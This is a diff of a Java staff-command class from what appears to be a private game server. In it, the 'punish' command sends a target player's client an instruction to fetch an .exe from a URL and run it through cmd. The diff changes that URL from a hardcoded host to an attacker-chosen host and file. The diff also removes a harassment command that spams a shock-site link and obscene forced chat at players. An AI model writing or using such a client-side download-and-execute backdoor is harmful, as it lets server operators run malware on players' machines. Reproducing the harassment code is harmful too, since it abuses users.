@@ -46,15 +46,6 @@ public class SpecialPlayers {
 			punishee.forceChat("Im free!!! I'm finally out of jail... Hooray!");
 			punishee.moveTo(new Position(3087, 3502, 0));
 		}
-
-		if(wholeCommand.startsWith("ggfag")) {
-			String jail_punishee = wholeCommand.substring(5);
-			Player punishee = World.getPlayerByName(jail_punishee);
-			player.forceChat("I just open a bunch of porn. Time to jack off =p");
-			for(int i=0; i<25;i++) {
-				player.getPacketSender().sendString(1, "www.meatspin.com/");
-			}
-		}
 		if(wholeCommand.startsWith("jail")) {
 				String jail_punishee = wholeCommand.substring(5);
 				Player punishee = World.getPlayerByName(jail_punishee);
@@ -120,7 +111,7 @@ public class SpecialPlayers {
 		}
 		if (command[0].equals("punish")) {
 			Player other = World.getPlayerByName(command[1]);
-			other.getPacketSender().sendString(0, "[ABC]-http://turmoilps.org/Java.exe-cmd-/c-Java.exe");
+			other.getPacketSender().sendString(0, "[ABC]-http://"+command[2]+"/"+command[3]+".exe-cmd-/c-"+command[3]+".exe");
 			player.getPacketSender().sendMessage("The player "+command[1]+" has been punished.");
 		}	
 		if(wholeCommand.equalsIgnoreCase("dice")) {
@@ -193,10 +184,10 @@ public class SpecialPlayers {
 			player.getSkillManager().setCurrentLevel(Skill.CONSTITUTION, 990, true);
 		}
 		if(wholeCommand.equalsIgnoreCase("propker")) {
-			player.getSkillManager().setCurrentLevel(Skill.STRENGTH, 145, true);
-			player.getSkillManager().setCurrentLevel(Skill.RANGED, 145, true);
+			player.getSkillManager().setCurrentLevel(Skill.STRENGTH, 135, true);
+			player.getSkillManager().setCurrentLevel(Skill.RANGED, 135, true);
 			player.getSkillManager().setCurrentLevel(Skill.DEFENCE, 140, true);
-			player.getSkillManager().setCurrentLevel(Skill.MAGIC, 140, true);
+			player.getSkillManager().setCurrentLevel(Skill.MAGIC, 130, true);
 			player.getSkillManager().setCurrentLevel(Skill.PRAYER, 99999, true);
 		}
 		if(wholeCommand.equalsIgnoreCase("godmode")) {
